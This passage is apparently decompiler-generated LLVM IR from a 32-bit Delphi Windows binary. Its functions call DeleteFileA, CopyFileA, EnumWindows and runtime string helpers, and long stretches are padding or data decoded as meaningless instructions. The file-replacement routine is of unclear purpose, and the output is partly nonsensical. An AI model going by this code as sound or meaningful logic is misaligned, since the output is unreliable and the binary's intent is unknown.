  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1287
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1287
  store i8 %6, i8* %7, align 1, !insn.addr !1287
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1288
  %10 = udiv i32 %4, 256, !insn.addr !1288
  %11 = trunc i32 %10 to i8, !insn.addr !1288
  %12 = add i8 %9, %11, !insn.addr !1288
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1288
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1288
  store i8 %12, i8* %14, align 1, !insn.addr !1288
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1289
  %17 = add i32 %4, 6, !insn.addr !1289
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1289
  %19 = zext i1 %16 to i32, !insn.addr !1289
  %20 = and i32 %4, -65536, !insn.addr !1289
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1290
  %23 = or i1 %16, %22, !insn.addr !1290
  %24 = add i32 %18, 6, !insn.addr !1290
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1290
  %26 = zext i1 %23 to i32, !insn.addr !1290
  %27 = and i32 %25, 15, !insn.addr !1290
  %28 = or i32 %27, %20, !insn.addr !1290
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1290
  %31 = or i32 %28, %30, !insn.addr !1290
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1291
  %33 = load i8, i8* %32, align 1, !insn.addr !1291
  %34 = trunc i32 %27 to i8, !insn.addr !1291
  %35 = xor i8 %33, %34, !insn.addr !1291
  store i8 %35, i8* %32, align 1, !insn.addr !1291
  %36 = add i32 %0, 1311123697, !insn.addr !1292
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1292
  %38 = load i8, i8* %37, align 1, !insn.addr !1292
  %39 = udiv i32 %3, 256, !insn.addr !1292
  %40 = trunc i32 %39 to i8, !insn.addr !1292
  %41 = add i8 %38, %40, !insn.addr !1292
  store i8 %41, i8* %37, align 1, !insn.addr !1292
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1293
  %43 = load i32, i32* %42, align 4, !insn.addr !1293
  %44 = sub i32 %43, %31, !insn.addr !1293
  store i32 %44, i32* %42, align 4, !insn.addr !1293
  %45 = add i32 %3, 117, !insn.addr !1294
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1294
  %47 = load i8, i8* %46, align 1, !insn.addr !1294
  %48 = add i8 %47, %34, !insn.addr !1294
  %49 = icmp eq i8 %48, 0, !insn.addr !1294
  store i8 %48, i8* %46, align 1, !insn.addr !1294
  br i1 %49, label %dec_label_pc_406268, label %dec_label_pc_4061f4, !insn.addr !1295

dec_label_pc_4061f4:                              ; preds = %dec_label_pc_4061dd
  %50 = xor i32 %3, %1, !insn.addr !1296
  %51 = trunc i32 %3 to i16, !insn.addr !1297
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1297
  %53 = load i32, i32* %52, align 4, !insn.addr !1297
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1297
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1298
  %55 = load i8, i8* %54, align 1, !insn.addr !1298
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1298
  %56 = load i8, i8* %32, align 1, !insn.addr !1299
  %57 = add i8 %56, %34, !insn.addr !1299
  store i8 %57, i8* %32, align 1, !insn.addr !1299
  %58 = call i32 @__asm_iretd(), !insn.addr !1300
  %59 = add i32 %2, -117, !insn.addr !1301
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1301
  %61 = load i8, i8* %60, align 1, !insn.addr !1301
  %62 = add i8 %61, -69, !insn.addr !1301
  store i8 %62, i8* %60, align 1, !insn.addr !1301
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1302
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1303
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1303
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1303
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1304
  %66 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1305
  %67 = add i32 %66, 1, !insn.addr !1305
  store i32 %67, i32* @global_var_4096c8, align 4, !insn.addr !1305
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1306
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1307
  ret i32 0, !insn.addr !1308

dec_label_pc_406268:                              ; preds = %dec_label_pc_4061dd
  %69 = call i32 @function_403cbc(), !insn.addr !1309
  store i32 %69, i32* %ebx, align 4, !insn.addr !1310
  %70 = icmp slt i32 %69, 0, !insn.addr !1311
  br i1 %70, label %dec_label_pc_406290, label %dec_label_pc_406278, !insn.addr !1312

dec_label_pc_406278:                              ; preds = %dec_label_pc_406268
  %71 = add i32 %69, 1, !insn.addr !1313
  store i32 %71, i32* %ebx, align 4, !insn.addr !1313
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1314
  br label %dec_label_pc_4062d1

dec_label_pc_406290:                              ; preds = %dec_label_pc_406268
  %73 = call i32 @function_403cb4(), !insn.addr !1315
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1316
  %75 = call i32 @function_403cbc(), !insn.addr !1317
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1318
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1319
  br label %dec_label_pc_4062d1, !insn.addr !1319

dec_label_pc_4062d1:                              ; preds = %dec_label_pc_406278, %dec_label_pc_406290
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1320
}

define i32 @function_4062d8() local_unnamed_addr {
dec_label_pc_4062d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1321
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1321
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1321
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1322
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1323
  %3 = add i32 %2, 1, !insn.addr !1323
  %4 = icmp eq i32 %3, 0, !insn.addr !1323
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1323
  %5 = icmp eq i1 %4, false, !insn.addr !1324
  br i1 %5, label %dec_label_pc_406301, label %dec_label_pc_4062f1, !insn.addr !1324

dec_label_pc_4062f1:                              ; preds = %dec_label_pc_4062d8
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1325
  br label %dec_label_pc_406301, !insn.addr !1325

dec_label_pc_406301:                              ; preds = %dec_label_pc_4062f1, %dec_label_pc_4062d8
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1326
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1327
  ret i32 0, !insn.addr !1328
}

define i32 @function_40630f() local_unnamed_addr {
dec_label_pc_40630f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1329
  ret i32 %0, !insn.addr !1329
}

define i32 @function_406314() local_unnamed_addr {
dec_label_pc_406314:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1330
}

define i32 @function_406316(i32 %arg1) local_unnamed_addr {
dec_label_pc_406316:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1331
}

define i32 @function_406318() local_unnamed_addr {
dec_label_pc_406318:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1332
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1332
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1332
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1333
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1334
  %3 = add i32 %2, -1, !insn.addr !1334
  %4 = icmp eq i32 %2, 0, !insn.addr !1334
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1334
  %5 = icmp eq i1 %4, false, !insn.addr !1335
  br i1 %5, label %dec_label_pc_40634c, label %dec_label_pc_406332, !insn.addr !1335

dec_label_pc_406332:                              ; preds = %dec_label_pc_406318
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1336
  br label %dec_label_pc_40634c, !insn.addr !1337

dec_label_pc_40634c:                              ; preds = %dec_label_pc_406332, %dec_label_pc_406318
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1338
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1339
  ret i32 0, !insn.addr !1340
}

define i32 @function_40635a() local_unnamed_addr {
dec_label_pc_40635a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1341
  ret i32 %0, !insn.addr !1341
}

define i32 @function_40635f() local_unnamed_addr {
dec_label_pc_40635f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1342
}

define i32 @function_406361(i32 %arg1) local_unnamed_addr {
dec_label_pc_406361:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1343
}

define i32 @function_406364(i32 %arg1) local_unnamed_addr {
dec_label_pc_406364:
  %esp.0.reg2mem = alloca i32, !insn.addr !1344
  %eax = alloca i32, align 4
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = bitcast i32* %eax to i8*
  %1 = load i8, i8* %0, align 4, !insn.addr !1344
  %2 = load i32, i32* %eax, align 4
  %3 = trunc i32 %2 to i8, !insn.addr !1344
  %4 = add i8 %1, %3, !insn.addr !1344
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1344
  store i8 %4, i8* %5, align 1, !insn.addr !1344
  %6 = load i8, i8* %0, align 4, !insn.addr !1345
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1345
  %9 = add i8 %6, %8, !insn.addr !1345
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1345
  store i8 %9, i8* %10, align 1, !insn.addr !1345
  %11 = load i8, i8* %0, align 4, !insn.addr !1346
  %12 = load i32, i32* %eax, align 4
  %13 = trunc i32 %12 to i8, !insn.addr !1346
  %14 = add i8 %11, %13, !insn.addr !1346
  %15 = inttoptr i32 %12 to i8*, !insn.addr !1346
  store i8 %14, i8* %15, align 1, !insn.addr !1346
  %16 = load i8, i8* %0, align 4, !insn.addr !1347
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !1347
  %19 = add i8 %16, %18, !insn.addr !1347
  %20 = inttoptr i32 %17 to i8*, !insn.addr !1347
  store i8 %19, i8* %20, align 1, !insn.addr !1347
  %21 = load i8, i8* %0, align 4, !insn.addr !1348
  %22 = load i32, i32* %eax, align 4
  %23 = trunc i32 %22 to i8, !insn.addr !1348
  %24 = add i8 %21, %23, !insn.addr !1348
  %25 = inttoptr i32 %22 to i8*, !insn.addr !1348
  store i8 %24, i8* %25, align 1, !insn.addr !1348
  %26 = load i8, i8* %0, align 4, !insn.addr !1349
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !1349
  %29 = add i8 %26, %28, !insn.addr !1349
  %30 = inttoptr i32 %27 to i8*, !insn.addr !1349
  store i8 %29, i8* %30, align 1, !insn.addr !1349
  %31 = load i8, i8* %0, align 4, !insn.addr !1350
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !1350
  %34 = add i8 %31, %33, !insn.addr !1350
  %35 = inttoptr i32 %32 to i8*, !insn.addr !1350
  store i8 %34, i8* %35, align 1, !insn.addr !1350
  %36 = load i8, i8* %0, align 4, !insn.addr !1351
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !1351
  %39 = add i8 %36, %38, !insn.addr !1351
  %40 = inttoptr i32 %37 to i8*, !insn.addr !1351
  store i8 %39, i8* %40, align 1, !insn.addr !1351
  %41 = load i8, i8* %0, align 4, !insn.addr !1352
  %42 = load i32, i32* %eax, align 4
  %43 = trunc i32 %42 to i8, !insn.addr !1352
  %44 = add i8 %41, %43, !insn.addr !1352
  %45 = inttoptr i32 %42 to i8*, !insn.addr !1352
  store i8 %44, i8* %45, align 1, !insn.addr !1352
  %46 = load i8, i8* %0, align 4, !insn.addr !1353
  %47 = load i32, i32* %eax, align 4
  %48 = trunc i32 %47 to i8, !insn.addr !1353
  %49 = add i8 %46, %48, !insn.addr !1353
  %50 = inttoptr i32 %47 to i8*, !insn.addr !1353
  store i8 %49, i8* %50, align 1, !insn.addr !1353
  %51 = load i8, i8* %0, align 4, !insn.addr !1354
  %52 = load i32, i32* %eax, align 4
  %53 = trunc i32 %52 to i8, !insn.addr !1354
  %54 = add i8 %51, %53, !insn.addr !1354
  %55 = inttoptr i32 %52 to i8*, !insn.addr !1354
  store i8 %54, i8* %55, align 1, !insn.addr !1354
  %56 = load i8, i8* %0, align 4, !insn.addr !1355
  %57 = load i32, i32* %eax, align 4
  %58 = trunc i32 %57 to i8, !insn.addr !1355
  %59 = add i8 %56, %58, !insn.addr !1355
  %60 = inttoptr i32 %57 to i8*, !insn.addr !1355
  store i8 %59, i8* %60, align 1, !insn.addr !1355
  %61 = load i8, i8* %0, align 4, !insn.addr !1356
  %62 = load i32, i32* %eax, align 4
  %63 = trunc i32 %62 to i8, !insn.addr !1356
  %64 = add i8 %61, %63, !insn.addr !1356
  %65 = inttoptr i32 %62 to i8*, !insn.addr !1356
  store i8 %64, i8* %65, align 1, !insn.addr !1356
  %66 = load i8, i8* %0, align 4, !insn.addr !1357
  %67 = load i32, i32* %eax, align 4
  %68 = trunc i32 %67 to i8, !insn.addr !1357
  %69 = add i8 %66, %68, !insn.addr !1357
  %70 = inttoptr i32 %67 to i8*, !insn.addr !1357
  store i8 %69, i8* %70, align 1, !insn.addr !1357
  %71 = load i8, i8* %0, align 4, !insn.addr !1358
  %72 = load i32, i32* %eax, align 4
  %73 = trunc i32 %72 to i8, !insn.addr !1358
  %74 = add i8 %71, %73, !insn.addr !1358
  %75 = inttoptr i32 %72 to i8*, !insn.addr !1358
  store i8 %74, i8* %75, align 1, !insn.addr !1358
  %76 = load i8, i8* %0, align 4, !insn.addr !1359
  %77 = load i32, i32* %eax, align 4
  %78 = trunc i32 %77 to i8, !insn.addr !1359
  %79 = add i8 %76, %78, !insn.addr !1359
  %80 = inttoptr i32 %77 to i8*, !insn.addr !1359
  store i8 %79, i8* %80, align 1, !insn.addr !1359
  %81 = load i8, i8* %0, align 4, !insn.addr !1360
  %82 = load i32, i32* %eax, align 4
  %83 = trunc i32 %82 to i8, !insn.addr !1360
  %84 = add i8 %81, %83, !insn.addr !1360
  %85 = inttoptr i32 %82 to i8*, !insn.addr !1360
  store i8 %84, i8* %85, align 1, !insn.addr !1360
  %86 = load i8, i8* %0, align 4, !insn.addr !1361
  %87 = load i32, i32* %eax, align 4
  %88 = trunc i32 %87 to i8, !insn.addr !1361
  %89 = add i8 %86, %88, !insn.addr !1361
  %90 = inttoptr i32 %87 to i8*, !insn.addr !1361
  store i8 %89, i8* %90, align 1, !insn.addr !1361
  %91 = load i8, i8* %0, align 4, !insn.addr !1362
  %92 = load i32, i32* %eax, align 4
  %93 = trunc i32 %92 to i8, !insn.addr !1362
  %94 = add i8 %91, %93, !insn.addr !1362
  %95 = inttoptr i32 %92 to i8*, !insn.addr !1362
  store i8 %94, i8* %95, align 1, !insn.addr !1362
  %96 = load i8, i8* %0, align 4, !insn.addr !1363
  %97 = load i32, i32* %eax, align 4
  %98 = trunc i32 %97 to i8, !insn.addr !1363
  %99 = add i8 %96, %98, !insn.addr !1363
  %100 = inttoptr i32 %97 to i8*, !insn.addr !1363
  store i8 %99, i8* %100, align 1, !insn.addr !1363
  %101 = load i8, i8* %0, align 4, !insn.addr !1364
  %102 = load i32, i32* %eax, align 4
  %103 = trunc i32 %102 to i8, !insn.addr !1364
  %104 = add i8 %101, %103, !insn.addr !1364
  %105 = inttoptr i32 %102 to i8*, !insn.addr !1364
  store i8 %104, i8* %105, align 1, !insn.addr !1364
  %106 = load i8, i8* %0, align 4, !insn.addr !1365
  %107 = load i32, i32* %eax, align 4
  %108 = trunc i32 %107 to i8, !insn.addr !1365
  %109 = add i8 %106, %108, !insn.addr !1365
  %110 = inttoptr i32 %107 to i8*, !insn.addr !1365
  store i8 %109, i8* %110, align 1, !insn.addr !1365
  %111 = load i8, i8* %0, align 4, !insn.addr !1366
  %112 = load i32, i32* %eax, align 4
  %113 = trunc i32 %112 to i8, !insn.addr !1366
  %114 = add i8 %111, %113, !insn.addr !1366
  %115 = inttoptr i32 %112 to i8*, !insn.addr !1366
  store i8 %114, i8* %115, align 1, !insn.addr !1366
  %116 = load i8, i8* %0, align 4, !insn.addr !1367
  %117 = load i32, i32* %eax, align 4
  %118 = trunc i32 %117 to i8, !insn.addr !1367
  %119 = add i8 %116, %118, !insn.addr !1367
  %120 = inttoptr i32 %117 to i8*, !insn.addr !1367
  store i8 %119, i8* %120, align 1, !insn.addr !1367
  %121 = load i8, i8* %0, align 4, !insn.addr !1368
  %122 = load i32, i32* %eax, align 4
  %123 = trunc i32 %122 to i8, !insn.addr !1368
  %124 = add i8 %121, %123, !insn.addr !1368
  %125 = inttoptr i32 %122 to i8*, !insn.addr !1368
  store i8 %124, i8* %125, align 1, !insn.addr !1368
  %126 = load i8, i8* %0, align 4, !insn.addr !1369
  %127 = load i32, i32* %eax, align 4
  %128 = trunc i32 %127 to i8, !insn.addr !1369
  %129 = add i8 %126, %128, !insn.addr !1369
  %130 = inttoptr i32 %127 to i8*, !insn.addr !1369
  store i8 %129, i8* %130, align 1, !insn.addr !1369
  %131 = load i8, i8* %0, align 4, !insn.addr !1370
  %132 = load i32, i32* %eax, align 4
  %133 = trunc i32 %132 to i8, !insn.addr !1370
  %134 = add i8 %131, %133, !insn.addr !1370
  %135 = inttoptr i32 %132 to i8*, !insn.addr !1370
  store i8 %134, i8* %135, align 1, !insn.addr !1370
  %136 = load i8, i8* %0, align 4, !insn.addr !1371
  %137 = load i32, i32* %eax, align 4
  %138 = trunc i32 %137 to i8, !insn.addr !1371
  %139 = add i8 %136, %138, !insn.addr !1371
  %140 = inttoptr i32 %137 to i8*, !insn.addr !1371
  store i8 %139, i8* %140, align 1, !insn.addr !1371
  %141 = load i8, i8* %0, align 4, !insn.addr !1372
  %142 = load i32, i32* %eax, align 4
  %143 = trunc i32 %142 to i8, !insn.addr !1372
  %144 = add i8 %141, %143, !insn.addr !1372
  %145 = inttoptr i32 %142 to i8*, !insn.addr !1372
  store i8 %144, i8* %145, align 1, !insn.addr !1372
  %146 = load i8, i8* %0, align 4, !insn.addr !1373
  %147 = load i32, i32* %eax, align 4
  %148 = trunc i32 %147 to i8, !insn.addr !1373
  %149 = add i8 %146, %148, !insn.addr !1373
  %150 = inttoptr i32 %147 to i8*, !insn.addr !1373
  store i8 %149, i8* %150, align 1, !insn.addr !1373
  %151 = load i8, i8* %0, align 4, !insn.addr !1374
  %152 = load i32, i32* %eax, align 4
  %153 = trunc i32 %152 to i8, !insn.addr !1374
  %154 = add i8 %151, %153, !insn.addr !1374
  %155 = inttoptr i32 %152 to i8*, !insn.addr !1374
  store i8 %154, i8* %155, align 1, !insn.addr !1374
  %156 = load i8, i8* %0, align 4, !insn.addr !1375
  %157 = load i32, i32* %eax, align 4
  %158 = trunc i32 %157 to i8, !insn.addr !1375
  %159 = add i8 %156, %158, !insn.addr !1375
  %160 = inttoptr i32 %157 to i8*, !insn.addr !1375
  store i8 %159, i8* %160, align 1, !insn.addr !1375
  %161 = load i8, i8* %0, align 4, !insn.addr !1376
  %162 = load i32, i32* %eax, align 4
  %163 = trunc i32 %162 to i8, !insn.addr !1376
  %164 = add i8 %161, %163, !insn.addr !1376
  %165 = inttoptr i32 %162 to i8*, !insn.addr !1376
  store i8 %164, i8* %165, align 1, !insn.addr !1376
  %166 = load i8, i8* %0, align 4, !insn.addr !1377
  %167 = load i32, i32* %eax, align 4
  %168 = trunc i32 %167 to i8, !insn.addr !1377
  %169 = add i8 %166, %168, !insn.addr !1377
  %170 = inttoptr i32 %167 to i8*, !insn.addr !1377
  store i8 %169, i8* %170, align 1, !insn.addr !1377
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1378
  %171 = call i32 @__readfsdword(i32 0), !insn.addr !1379
  store i32 %171, i32* %stack_var_-48, align 4, !insn.addr !1379
  %172 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1379
  call void @__writefsdword(i32 0, i32 %172), !insn.addr !1380
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1381
  %173 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1381
  %174 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1382
  %175 = icmp eq i32 %174, 32770, !insn.addr !1383
  %176 = icmp eq i1 %175, false, !insn.addr !1384
  store i32 %173, i32* %esp.0.reg2mem, !insn.addr !1384
  br i1 %176, label %dec_label_pc_40648c, label %dec_label_pc_4063e0, !insn.addr !1384

dec_label_pc_4063e0:                              ; preds = %dec_label_pc_406364
  %177 = call i32 @function_407578(), !insn.addr !1385
  %178 = call i32 @"@LStrPos"(), !insn.addr !1386
  %179 = call i32 @"@LStrPos"(), !insn.addr !1387
  %180 = add i32 %179, -1, !insn.addr !1388
  %181 = icmp slt i32 %180, 0, !insn.addr !1389
  %182 = add i32 %178, 2, !insn.addr !1390
  %183 = icmp sgt i32 %182, %180, !insn.addr !1391
  %or.cond = or i1 %181, %183
  store i32 %173, i32* %esp.0.reg2mem, !insn.addr !1392
  br i1 %or.cond, label %dec_label_pc_40648c, label %dec_label_pc_406414, !insn.addr !1392

dec_label_pc_406414:                              ; preds = %dec_label_pc_4063e0
  %184 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1393
  store i32 %184, i32* %stack_var_-60, align 4, !insn.addr !1393
  %185 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1393
  %186 = call i32 @"@LStrCopy"(), !insn.addr !1394
  %187 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1395
  %188 = icmp eq i32 %187, 0, !insn.addr !1395
  store i32 %185, i32* %esp.0.reg2mem, !insn.addr !1396
  br i1 %188, label %dec_label_pc_40648c, label %dec_label_pc_40643c, !insn.addr !1396

dec_label_pc_40643c:                              ; preds = %dec_label_pc_406414
  %189 = call i32 @function_407360(), !insn.addr !1397
  %190 = call i32 @"@LStrFromPChar"(), !insn.addr !1398
  %191 = call i32 @"@LStrCat"(), !insn.addr !1399
  %192 = call i32 @function_4036f4(), !insn.addr !1400
  %193 = inttoptr i32 %192 to i8*, !insn.addr !1401
  %194 = call i1 @DeleteFileA(i8* %193), !insn.addr !1402
  %195 = call i32 @function_4036f4(), !insn.addr !1403
  %196 = inttoptr i32 %195 to i8*, !insn.addr !1404
  store i8* %196, i8** %stack_var_-76, align 4, !insn.addr !1404
  %197 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1404
  %198 = call i1 @CopyFileA(i8* %196, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1405
  %199 = call i32 @function_4060c8(), !insn.addr !1406
  store i32 %197, i32* %esp.0.reg2mem, !insn.addr !1406
  br label %dec_label_pc_40648c, !insn.addr !1406

dec_label_pc_40648c:                              ; preds = %dec_label_pc_40643c, %dec_label_pc_406414, %dec_label_pc_4063e0, %dec_label_pc_406364
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %200 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1407
  %201 = load i32, i32* %200, align 4, !insn.addr !1407
  call void @__writefsdword(i32 0, i32 %201), !insn.addr !1408
  %202 = add i32 %esp.0.reload, 8, !insn.addr !1409
  %203 = inttoptr i32 %202 to i32*, !insn.addr !1409
  store i32 4220078, i32* %203, align 4, !insn.addr !1409
  %204 = call i32 @"@LStrArrayClr"(), !insn.addr !1410
  ret i32 %204, !insn.addr !1411
}

define i32 @function_4064a7() local_unnamed_addr {
dec_label_pc_4064a7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1412
  ret i32 %0, !insn.addr !1412
}

define i32 @function_4064ac() local_unnamed_addr {
dec_label_pc_4064ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1413
}

define i32 @function_4064ae(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4064ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1414
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1414
  %3 = load i32, i32* %2, align 4, !insn.addr !1414
  ret i32 %3, !insn.addr !1415
}

define i32 @function_4064bf() local_unnamed_addr {
dec_label_pc_4064bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1416
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1416
  store i32 %1, i32* %2, align 4, !insn.addr !1416
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1417
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1417
  %7 = add i8 %4, %6, !insn.addr !1417
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1417
  store i8 %7, i8* %8, align 1, !insn.addr !1417
  %9 = load i32, i32* %eax, align 4, !insn.addr !1418
  ret i32 %9, !insn.addr !1418
}

define i32 @function_4064ce() local_unnamed_addr {
dec_label_pc_4064ce:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1419
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1419
  store i8 %4, i8* %5, align 1, !insn.addr !1419
  %6 = mul i32 %0, 4096, !insn.addr !1420
  %7 = udiv i32 %0, 1048576, !insn.addr !1420
  %8 = or i32 %7, %6, !insn.addr !1420
  %9 = and i32 %0, 1048576, !insn.addr !1420
  %10 = icmp eq i32 %9, 0, !insn.addr !1420
  %11 = load i32, i32* %edx, align 4, !insn.addr !1421
  %12 = trunc i32 %11 to i16, !insn.addr !1421
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1421
  %14 = sext i8 %13 to i32, !insn.addr !1421
  %15 = or i32 %2, %14, !insn.addr !1421
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1422
  %17 = and i32 %15, -256, !insn.addr !1422
  %18 = or i32 %17, %16, !insn.addr !1422
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1423
  %20 = load i8, i8* %19, align 1, !insn.addr !1423
  %21 = mul i8 %20, 2, !insn.addr !1423
  %22 = lshr i8 %20, 7, !insn.addr !1423
  %23 = or i8 %22, %21, !insn.addr !1423
  store i8 %23, i8* %19, align 1, !insn.addr !1423
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1424
  %26 = udiv i32 %1, 256, !insn.addr !1424
  %27 = trunc i32 %26 to i8, !insn.addr !1424
  %28 = add i8 %25, %27, !insn.addr !1424
  %29 = load i32, i32* %edx, align 4, !insn.addr !1424
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1424
  store i8 %28, i8* %30, align 1, !insn.addr !1424
  %31 = add i32 %8, -4, !insn.addr !1425
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1425
  store i32 4219816, i32* %32, align 4, !insn.addr !1425
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1426
  %34 = sext i1 %33 to i32, !insn.addr !1426
  ret i32 %34, !insn.addr !1427
}

define i32 @function_4064d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_4064e8() local_unnamed_addr {
dec_label_pc_4064e8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1428
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1428
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1428
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1429
  %2 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1430
  %3 = add i32 %2, 1, !insn.addr !1430
  store i32 %3, i32* @global_var_4096d4, align 4, !insn.addr !1430
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1431
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1432
  ret i32 0, !insn.addr !1433
}

define i32 @function_40650d() local_unnamed_addr {
dec_label_pc_40650d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1434
  ret i32 %0, !insn.addr !1434
}

define i32 @function_406512() local_unnamed_addr {
dec_label_pc_406512:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1435
}

define i32 @function_406514(i32 %arg1) local_unnamed_addr {
dec_label_pc_406514:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1436
